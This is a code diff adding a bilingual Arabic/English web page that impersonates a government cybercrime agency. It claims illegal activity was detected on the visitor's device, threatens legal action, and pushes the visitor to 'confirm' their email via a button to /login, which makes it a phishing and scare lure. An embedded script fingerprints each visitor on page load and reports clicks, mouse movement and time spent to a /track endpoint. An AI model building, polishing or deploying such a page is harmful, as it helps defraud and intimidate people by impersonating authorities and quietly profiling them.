@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>بلاغ رسمي</title>
+  <style>
+    :root{
+      --red:#c82333;
+      --grey:#fafafa;
+      --card:#ffffff;
+      --border:#e6e6e6;
+      --text:#333;
+    }
+    html,body{
+      margin:0;padding:0;
+      background:var(--grey);
+      font-family:"Tajawal", Arial, sans-serif;
+      color:var(--text)
+    }
+    .wrap{max-width:840px;margin:40px auto;padding:0 16px}
+    .agency{font-weight:700;text-align:center;margin-bottom:10px}
+    .card{
+      position:relative;
+      background: var(--card) url("https://i.ibb.co/fdKfbpGx/IMG-1398.jpg") center center / 300px auto no-repeat;
+      border:1px solid var(--border);
+      border-radius:10px;
+      padding:28px 22px;
+      box-shadow:0 8px 20px rgba(0,0,0,.04);
+      background-blend-mode: lighten; 
+    }
+    h2.title{
+      text-align:center;margin:0 0 10px;
+      font-size:28px;color:var(--red);font-weight:800;letter-spacing:.3px
+    }
+    hr.sep{border:none;border-top:1px solid var(--border);margin:16px auto 18px;width:85%}
+    .p{margin:10px 0;text-align:center;line-height:1.9}
+    .en h3{color:var(--red);margin:10px 0 8px;text-align:center}
+    .cta{
+      display:block;width:max-content;margin:22px auto 6px;
+      background:var(--red);color:#fff;border:none;border-radius:8px;
+      padding:13px 22px;font-size:18px;cursor:pointer;text-decoration:none
+    }
+    @media (max-width:480px){
+      h2.title{font-size:24px}
+      .p{font-size:15px}
+      .cta{width:100%;text-align:center}
+    }
+    @font-face{
+      font-family:"Tajawal";
+      src: url("https://fonts.gstatic.com/s/tajawal/v11/Iurf6YBj_oCad4k1l4Qa.woff2") format("woff2");
+      font-weight:400;font-style:normal;font-display:swap;
+    }
+    @font-face{
+      font-family:"Tajawal";
+      src: url("https://fonts.gstatic.com/s/tajawal/v11/IurQ6YBj_oCad4k1qYQ.woff2") format("woff2");
+      font-weight:700;font-style:normal;font-display:swap;
+    }
+    @font-face{
+      font-family:"Tajawal";
+      src: url("https://fonts.gstatic.com/s/tajawal/v11/IurW6YBj_oCad4k1m4Y.woff2") format("woff2");
+      font-weight:800;font-style:normal;font-display:swap;
+    }
+    /* بدّلي تعريف .card القديم بهذا */
+.card{
+  position: relative;           /* مهم عشان الـ ::before يتمركز داخل الكارت */
+  background: var(--card);      /* خلفية بيضاء صافية للكارت */
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 28px 22px;
+  box-shadow: 0 8px 20px rgba(0,0,0,.04);
+}
+
+/* اللوجو خلف الكلام مباشرة داخل الكارت */
+.card::before{
+  content: "";
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 320px;                 /* زوّدي/قلّلي الحجم لو حابة */
+  height: 320px;
+  transform: translate(-50%, -50%);
+  background: url("https://i.ibb.co/fdKfbpGx/IMG-1398.jpg") center/contain no-repeat;
+  opacity: 0.14;                /* لو عايزة أوضح: خليها 0.18 أو 0.22 */
+  pointer-events: none;         /* عشان ما يعطّليش الضغط على الزر */
+  filter: grayscale(100%);              /* يخلّيه باللون الأخضر الأصلي */
+  z-index: 0;
+}
+
+/* خلّي النص فوق اللوجو */
+.card > *{
+  position: relative;
+  z-index: 1;
+}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="agency">الإدارة العامة لمكافحة الجرائم الإلكترونية</div>
+
+    <div class="card" id="card">
+      <h2 class="title">🚨 تم رصد نشاط إلكتروني غير قانوني</h2>
+
+      <p class="p">ورد إلى إدارة مكافحة الجرائم الإلكترونية بلاغ يحتوي على مؤشرات رقمية تؤكد وجود نشاط إلكتروني مشبوه صادر من هذا الجهاز.</p>
+      <p class="p">يرجى العلم أن عدم التعاون في مراجعة هذا البلاغ قد يؤدي إلى اتخاذ إجراءات قانونية مباشرة.</p>
+      <p class="p">لأسباب أمنية، يُرجى تأكيد البريد الإلكتروني المرتبط بالنشاط المُبلغ عنه من خلال الضغط على الزر أدناه.</p>
+
+      <hr class="sep" />
+
+      <div class="en">
+        <h3>🚨 Suspicious Cyber Activity Detected</h3>
+        <p class="p">The Cybercrime Unit has received a report with digital evidence indicating suspicious activity originating from this device.</p>
+        <p class="p">Failure to cooperate with the review process may lead to immediate legal consequences.</p>
+        <p class="p">For security verification, please confirm the associated email by clicking the button below.</p>
+      </div>
+
+      <a href="/login" class="cta" id="followBtn">⛔️ متابعة البلاغ / Follow up Report</a>
+    </div>
+  </div>
+
+  <script>
+    const startedAt = Date.now();
+    let clicks = 0;
+    let moves = 0;
+
+    document.addEventListener('click', () => clicks++);
+    document.addEventListener('mousemove', () => moves++);
+
+    const details = () => ({
+      event: "page_open",
+      lang: navigator.language || "",
+      ua: navigator.userAgent,
+      platform: navigator.platform || "",
+      screen: { w: screen.width, h: screen.height, dpr: window.devicePixelRatio || 1 },
+      viewport: { w: innerWidth, h: innerHeight },
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+      ref: document.referrer || ""
+    });
+
+    fetch('/track', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(details())
+    }).catch(()=>{});
+
+    document.getElementById('followBtn').addEventListener('click', () => {
+      const payload = {
+        event: "button_click",
+        time_spent: Math.floor((Date.now()-startedAt)/1000),
+        clicks, moves
+      };
+      navigator.sendBeacon('/track', new Blob([JSON.stringify(payload)], {type:'application/json'}));
+    });
+
+    window.addEventListener('beforeunload', () => {
+      const payload = {
+        event: "page_exit",
+        time_spent: Math.floor((Date.now()-startedAt)/1000),
+        clicks, moves
+      };
+      navigator.sendBeacon('/track', new Blob([JSON.stringify(payload)], {type:'application/json'}));
+    });
+  </script>
+</body>
+</html>
